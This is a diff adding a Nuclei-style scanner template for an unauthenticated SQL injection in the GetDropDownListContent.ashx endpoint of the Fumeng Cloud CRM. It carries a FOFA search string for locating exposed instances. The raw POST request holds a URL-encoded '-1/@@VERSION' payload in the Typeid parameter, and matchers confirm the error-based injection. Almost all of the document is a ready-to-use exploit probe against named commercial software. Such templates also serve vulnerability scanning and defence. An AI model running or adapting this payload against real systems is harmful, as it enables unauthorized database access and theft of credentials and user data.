@@ -1,0 +1,27 @@
+id: fumeng-cloud-crm-getdropdownlistcontent-sqli
+
+info:
+  name: 孚盟云CRM GetDropDownListContent.ashx接口SQL注入漏洞
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: app="孚盟软件-孚盟云"
+        上海孚盟软件有限公司作为外贸SaaS服务及行业解决方案提供商，其孚盟云CRM系统中GetDropDownListContent.ashx处理接口存在SQL注入缺陷。攻击者可利用该漏洞在未认证的情况下执行恶意SQL语句，导致数据库敏感信息泄露，包括但不限于管理员凭证及用户数据。在具备高权限的情况下，可能进一步实现服务器端木马植入及系统权限获取。
+  tags: 孚盟云CRM
+
+http:
+- raw:
+  - |
+    POST /Ajax/GetDropDownListContent.ashx HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: application/x-www-form-urlencoded
+
+    action=getType&Typeid=%2d%31%2f%40%40%56%45%52%53%49%4f%4e
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [500]
+  - type: word
+    part: body
+    words:
+    - 'Microsoft'
